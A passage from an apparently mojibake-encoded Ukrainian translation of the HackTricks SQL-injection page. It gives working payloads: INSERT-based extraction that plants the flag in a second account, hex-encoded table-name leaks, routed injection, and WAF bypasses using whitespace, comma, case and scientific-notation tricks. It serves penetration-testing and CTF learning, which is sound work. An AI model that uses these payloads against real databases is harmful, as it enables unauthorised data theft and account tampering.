- –í—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ, –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –º–æ–∂–Ω–∞ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ–Ω–∞—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `admin_generic@example.com` –∑ –ø–∞—Ä–æ–ª–µ–º, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î bcrypt —Ö–µ—à—É ("bcrypt_hash_of_newpassword" –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—î bcrypt —Ö–µ—à –Ω–æ–≤–æ–≥–æ –ø–∞—Ä–æ–ª—è, —è–∫–∏–π —Å–ª—ñ–¥ –∑–∞–º—ñ–Ω–∏—Ç–∏ –Ω–∞ —Ñ–∞–∫—Ç–∏—á–Ω–∏–π —Ö–µ—à –±–∞–∂–∞–Ω–æ–≥–æ –ø–∞—Ä–æ–ª—è).

### –í–∏—Ç—è–≥ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó

#### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è 2 –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –æ–¥–Ω–æ—á–∞—Å–Ω–æ

–ü—Ä–∏ —Å–ø—Ä–æ–±—ñ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø–æ—Ç—Ä—ñ–±–Ω—ñ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –ø–∞—Ä–æ–ª—å —Ç–∞ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞ –ø–æ—à—Ç–∞:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–µ—Å—è—Ç–∫–æ–≤–∏—Ö –∞–±–æ —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏—Ö

–ó —Ü—ñ—î—é —Ç–µ—Ö–Ω—ñ–∫–æ—é –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏—Ç—è–≥—É–≤–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —Å—Ç–≤–æ—Ä—é—é—á–∏ –ª–∏—à–µ 1 –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å. –í–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ –≤–∞–º –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω—ñ—á–æ–≥–æ –∫–æ–º–µ–Ω—Ç—É–≤–∞—Ç–∏.

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **hex2dec** —Ç–∞ **substr**:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
–©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ç–µ–∫—Å—Ç, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **hex** —Ç–∞ **replace** (—ñ **substr**):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) —î –Ω–∞–π–∞–∫—Ç—É–∞–ª—å–Ω—ñ—à–æ—é –ø–æ–¥—ñ—î—é –≤ —Å—Ñ–µ—Ä—ñ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ –≤ **–Ü—Å–ø–∞–Ω—ñ—ó** —Ç–∞ –æ–¥–Ω—ñ—î—é –∑ –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–∏—Ö –≤ **–Ñ–≤—Ä–æ–ø—ñ**. –ó **–º–µ—Ç–æ—é –ø–æ–ø—É–ª—è—Ä–∏–∑–∞—Ü—ñ—ó —Ç–µ—Ö–Ω—ñ—á–Ω–∏—Ö –∑–Ω–∞–Ω—å**, —Ü–µ–π –∫–æ–Ω–≥—Ä–µ—Å —î –≥–∞—Ä—è—á–æ—é —Ç–æ—á–∫–æ—é –∑—É—Å—Ç—Ä—ñ—á—ñ –¥–ª—è –ø—Ä–æ—Ñ–µ—Å—ñ–æ–Ω–∞–ª—ñ–≤ —É —Å—Ñ–µ—Ä—ñ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ–π —Ç–∞ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ –≤ —É—Å—ñ—Ö –¥–∏—Å—Ü–∏–ø–ª—ñ–Ω–∞—Ö.

{% embed url="https://www.rootedcon.com/" %}

## Routed SQL injection

Routed SQL injection - —Ü–µ —Å–∏—Ç—É–∞—Ü—ñ—è, –∫–æ–ª–∏ —ñ–Ω'—î–∫—Ü—ñ–π–Ω–∏–π –∑–∞–ø–∏—Ç –Ω–µ —î —Ç–∏–º, —è–∫–∏–π –¥–∞—î –≤–∏—Ö—ñ–¥, –∞–ª–µ –≤–∏—Ö—ñ–¥ —ñ–Ω'—î–∫—Ü—ñ–π–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É –π–¥–µ –¥–æ –∑–∞–ø–∏—Ç—É, —è–∫–∏–π –¥–∞—î –≤–∏—Ö—ñ–¥. ([–ó –¥–æ–∫—É–º–µ–Ω—Ç–∞](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

–ü—Ä–∏–∫–ª–∞–¥:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF Bypass

[–ü–æ—á–∞—Ç–∫–æ–≤—ñ –æ–±—Ö–æ–¥–∏ –∑–≤—ñ–¥—Å–∏](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### –û–±—Ö—ñ–¥ –±–µ–∑ –ø—Ä–æ–±—ñ–ª—ñ–≤

No Space (%20) - –æ–±—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤ –ø—Ä–æ–±—ñ–ª—ñ–≤
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
No Whitespace - –æ–±—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–µ–Ω—Ç–∞—Ä—ñ–≤
```sql
?id=1/*comment*/and/**/1=1/**/--
```
No Whitespace - –æ–±—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –¥—É–∂–æ–∫
```sql
?id=(1)and(1)=(1)--
```
### No commas bypass

No Comma - –æ–±—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é OFFSET, FROM —Ç–∞ JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Generic Bypasses

–ß–æ—Ä–Ω–∏–π —Å–ø–∏—Å–æ–∫ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–ª—é—á–æ–≤–∏—Ö —Å–ª—ñ–≤ - –æ–±—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–µ–ª–∏–∫–∏—Ö/–º–∞–ª–∏—Ö –ª—ñ—Ç–µ—Ä
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
–ß–æ—Ä–Ω–∏–π —Å–ø–∏—Å–æ–∫ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–ª—é—á–æ–≤–∏—Ö —Å–ª—ñ–≤ –±–µ–∑ —É—Ä–∞—Ö—É–≤–∞–Ω–Ω—è —Ä–µ–≥—ñ—Å—Ç—Ä—É - –æ–±—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω–æ–≥–æ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### –û–±—Ö—ñ–¥ WAF –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—É–∫–æ–≤–æ—ó –Ω–æ—Ç–∞—Ü—ñ—ó

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–µ –ø–æ—è—Å–Ω–µ–Ω–Ω—è —Ü—å–æ–≥–æ —Ç—Ä—é–∫—É –≤ [–±–ª–æ–∑—ñ gosecure](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
–í –æ—Å–Ω–æ–≤–Ω–æ–º—É, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—É–∫–æ–≤—É –Ω–æ—Ç–∞—Ü—ñ—é –Ω–µ—Å–ø–æ–¥—ñ–≤–∞–Ω–∏–º–∏ —Å–ø–æ—Å–æ–±–∞–º–∏, —â–æ–± –æ–±—ñ–π—Ç–∏ WAF:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### Bypass Column Names Restriction

–ü–æ-–ø–µ—Ä—à–µ, –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —è–∫—â–æ **–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π –∑–∞–ø–∏—Ç —ñ —Ç–∞–±–ª–∏—Ü—è, –∑ —è–∫–æ—ó –≤–∏ —Ö–æ—á–µ—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ –ø—Ä–∞–ø–æ—Ä, –º–∞—é—Ç—å –æ–¥–Ω–∞–∫–æ–≤—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Å—Ç–æ–≤–ø—Ü—ñ–≤**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –∑—Ä–æ–±–∏—Ç–∏: `0 UNION SELECT * FROM flag`

–ú–æ–∂–ª–∏–≤–æ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ç—Ä–µ—Ç—å–æ–≥–æ —Å—Ç–æ–≤–ø—Ü—è —Ç–∞–±–ª–∏—Ü—ñ –±–µ–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –π–æ–≥–æ –Ω–∞–∑–≤–∏** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞–ø–∏—Ç—É, –ø–æ–¥—ñ–±–Ω–æ–≥–æ –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, —Ç–æ–º—É –≤ sqlinjection —Ü–µ –≤–∏–≥–ª—è–¥–∞—Ç–∏–º–µ —Ç–∞–∫:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
–ê–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **comma bypass**:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
–¶–µ–π —Ç—Ä—é–∫ –±—É–≤ –≤–∑—è—Ç–∏–π –∑ [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –æ–±—Ö–æ–¥—É WAF

{% embed url="https://github.com/m4ll0k/Atlas" %}

## –Ü–Ω—à—ñ –ø–æ—Å—ñ–±–Ω–∏–∫–∏

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## –°–ø–∏—Å–æ–∫ –≤–∏—è–≤–ª–µ–Ω–Ω—è Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) —î –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–æ—é –ø–æ–¥—ñ—î—é –≤ —Å—Ñ–µ—Ä—ñ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ –≤ **–Ü—Å–ø–∞–Ω—ñ—ó** —Ç–∞ –æ–¥–Ω—ñ—î—é –∑ –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–∏—Ö –≤ **–Ñ–≤—Ä–æ–ø—ñ**. –ó **–º–µ—Ç–æ—é –ø—Ä–æ—Å—É–≤–∞–Ω–Ω—è —Ç–µ—Ö–Ω—ñ—á–Ω–∏—Ö –∑–Ω–∞–Ω—å**, —Ü–µ–π –∫–æ–Ω–≥—Ä–µ—Å —î –≥–∞—Ä—è—á–æ—é —Ç–æ—á–∫–æ—é –∑—É—Å—Ç—Ä—ñ—á—ñ –¥–ª—è –ø—Ä–æ—Ñ–µ—Å—ñ–æ–Ω–∞–ª—ñ–≤ —É —Å—Ñ–µ—Ä—ñ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ–π —Ç–∞ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ –≤ –∫–æ–∂–Ω—ñ–π –¥–∏—Å—Ü–∏–ø–ª—ñ–Ω—ñ.

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ç—Ä—é–∫–∞–º–∏ —Ö–∞–∫–µ—Ä—ñ–≤, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
